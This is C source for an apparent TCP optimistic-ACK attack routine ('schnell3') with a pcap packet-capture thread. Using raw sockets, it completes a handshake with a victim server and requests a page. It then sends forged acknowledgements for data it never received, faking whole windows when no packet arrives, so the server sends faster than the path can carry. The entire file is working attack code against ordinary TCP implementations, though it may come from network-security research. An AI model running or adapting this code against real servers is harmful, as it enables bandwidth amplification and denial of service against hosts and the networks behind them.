#include <netdb.h>
#include <arpa/inet.h>
#include <string.h>
#include <assert.h>
#include <unistd.h>
#include <pthread.h>
#include <time.h>
#include <sys/types.h>
#include <pcap.h>
#include <netinet/tcp.h>

#include "schnell.h"
#include "packetqueue.h"
int do_schnell3_attack(rawSock){
	int retries=0;
	packet *p;
	int slowstart=1;
	int nSegments=1;
	unsigned int lastACK,delayACK;
	struct timeval now,delayACKtime;
	struct timespec timeout;
	int msDelay=usRTT*2;	// RTO is RTT+4*deviation, so estimate it
	int delayACKtimeout = usRTT;
	int count,i,didDelayAck;
	unsigned int tmp;
	int WindowMax=65535;
	int err;
	unsigned int ISN;
	pthread_t grabberThread;
	packetqueue * q;


	// do three way handshake
        do {
                sendSYN(rawSock);
                retries++;
        } while( getSYNACK(rawSock) && (retries < 10));
	ISN=victimSequence;
        victimSequence++;
        localSequence++;
        sendACK(rawSock);
	// send request
        sendHTMLGET(rawSock);   // send "GET URL\r\n" to server
	// setup stuff
	q = packetqueue_create();
	// FIXME might want to grab the ACK
        err=pthread_create(&grabberThread,NULL,packetGrabber3,q);
	lastACK=victimSequence;
	didDelayAck=0;
	// loop until connection close
	while(!gotFINorRST){
		gettimeofday(&now,NULL);
		now.tv_usec+=msDelay*1000;
		timeout.tv_sec = now.tv_sec;
		timeout.tv_nsec = now.tv_usec * 1000;
		// wait for a packet
		Window = MIN(65535,(nSegments+2)*MSS*2);
		if(pq_waitforpacket(q,&timeout)){		
			// got one 
			while((p = pq_dequeue_nowait(q))){
				if(slowstart){
					printf("CASE 1: ");
					// did we drop one and not WRAP in the sequence
					if(((p->seq+MSS -lastACK)>MSS)&&((p->seq+MSS)>lastACK)){
						tmp = lastACK;
						count=0;
						while(tmp<(p->seq+MSS)){
							tmp+=MSS;
							ACK(rawSock,tmp);// send missing ACKs
							nSegments++;
							count++;
						}
						printf("faked %d packets; ",count);
					}
					ACK(rawSock,p->seq+MSS);	// ACK the one we got
					lastACK=p->seq+MSS;
					nSegments++;
					if((nSegments*MSS)>WindowMax)
						slowstart=0; // going to congestion control
					printf("SENT SS ACK: segs= %d : SEQ %u\n",nSegments,
							lastACK-ISN);
					free(p);
				}else {	// in congestion control
					printf("CASE 2: ");
					delayACK=p->seq+MSS;
					free(p);
					if(didDelayAck){ 	// check if we show send the ack,
								// and not delay it
						gettimeofday(&now,NULL);
						tmp = (now.tv_sec-delayACKtime.tv_sec)*1000*1000;
						tmp+= now.tv_usec-delayACKtime.tv_usec;
						if(tmp>delayACKtimeout){
							lastACK=delayACK;
							ACK(rawSock,lastACK);
							didDelayAck=0;
							printf("sent delayed ACK: %u\n",lastACK);
						} else{
							printf("%u delayed\n",delayACK);
						}
						continue;
					} 
					gettimeofday(&delayACKtime,NULL);
					didDelayAck=1;
					printf("%u delayed\n",delayACK);
				}
			}
			continue;	// got a packet while waiting
		}

		// no packet available at all: Timeout!
		if(slowstart){
			// make up the next  packets, as if we got them
			count = nSegments/2;	// be conservative
			for(i=0;i<count;i++){
				lastACK+=MSS;
				ACK(rawSock,lastACK);
				didDelayAck=0;
			}
			nSegments+=count;
			printf("Case 4: Faked Slowstart %d pacets to %d segments\n",
					count,nSegments);
		} else { // congestion control
			if(didDelayAck){	// first send any delayed ACK
				ACK(rawSock,delayACK);
				lastACK=delayACK;
				didDelayAck=0;
				printf("Case 5: sent late ACK\n");
			}else{
				// QUESTION: should we do this if we send the delayed ACK too?
				count = nSegments/2;
				lastACK+=count*MSS;
				ACK(rawSock,lastACK);
				printf("Case 6: faked entire window\n");
			}
		}
	}	// while(!fin or rst)
	return 0;
}	// function



/* void * packetGrabber(void *);
 *      similar to packetHandler, but multithreaded, with locking
 */

void * packetGrabber3(void *arg){
	packetqueue *q = (packetqueue *)arg;
        struct tcphdr *tcph;
        const unsigned char * packet;
        struct pcap_pkthdr pcap_hdr;
        while(1){
                packet = pcap_next(PcapHandle,&pcap_hdr);
                if(packet == NULL){
                        fprintf(stderr,"pcap_next: err\n");
                        continue;
                }
                tcph = (struct tcphdr*) (packet + 34);	// 14 + 20 = ethernet + ip hdrs
		if(pcap_hdr.len<=(14+20+20))	// ignore packets w/no data
			continue;
		pq_enqueue(q,ntohl(tcph->seq),pcap_hdr.ts);
                if(tcph->fin||tcph->rst)
                        gotFINorRST=1;
        }
        return NULL;
}

